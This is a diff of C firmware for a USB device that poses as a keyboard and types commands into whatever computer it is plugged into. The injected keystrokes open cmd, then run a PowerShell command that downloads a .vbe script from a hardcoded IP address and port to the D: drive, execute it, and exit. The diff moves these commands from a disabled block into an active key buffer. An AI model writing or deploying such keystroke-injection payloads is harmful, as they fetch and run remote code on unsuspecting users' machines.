@@ -36,7 +36,7 @@ struct system_config
 
 char *key_buffer[4] = {
 	/* this memory use as system config */
-	"\xef\xbe\xad\xde\x40\x42\x0F\x00\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
+	"\xef\xbe\xad\xde\xe0\x93\x04\x00\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
 	"powershell (New-Object \"System.Net.WebClient\").DownloadFile('http://123.56.12.242:8421/test.vbe', 'D:\\test.vbe')\n\0\0\0\0\0\0\0\0\0\0\0\0",
 	"D:\\test.vbe\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
 	"exit\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
@@ -436,6 +436,7 @@ void __local_irq_enable(void)
 }
 
 #define DUMP_VAR4(var)          printf(#var":\t 0x%08x\n", var)
+
 int main(void)
 {
 	uint32_t i;
@@ -496,9 +497,10 @@ int main(void)
 		//keyboard_send_string("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1");
 		keyboard_send_string("cmd\n\n");
 		
-		/*******switch the input method to english **********/
+		/*******在这里切换输入法到英文**********/
 		__keyboard_send(Buffer_Shift);
 		__keyboard_send(buffer_release);
+		Delay(1000000);
 		/****************************************************/
 		
 		for(i = 1; i < 4; i++) {
@@ -506,20 +508,18 @@ int main(void)
 				keyboard_send_string(key_buffer[i]);
 			}
 		}
-#if 0
-		keyboard_send_string("powershell (New-Object \"System.Net.WebClient\").DownloadFile('http://123.56.12.242:8421/test.vbe', 'D:\\test.vbe')\n");
-		keyboard_send_string("D:\\test.vbe\n");
-		keyboard_send_string("exit\n");
-#endif
+
 		break;
   }
 
 	while(1)
 	{	
+#if 0		
 		gpio_write(GROUPB, 1, 0);
 		delay(1000);
 		gpio_write(GROUPB, 1, 1);
 		delay(1000);
+#endif
 	}
 	
 }
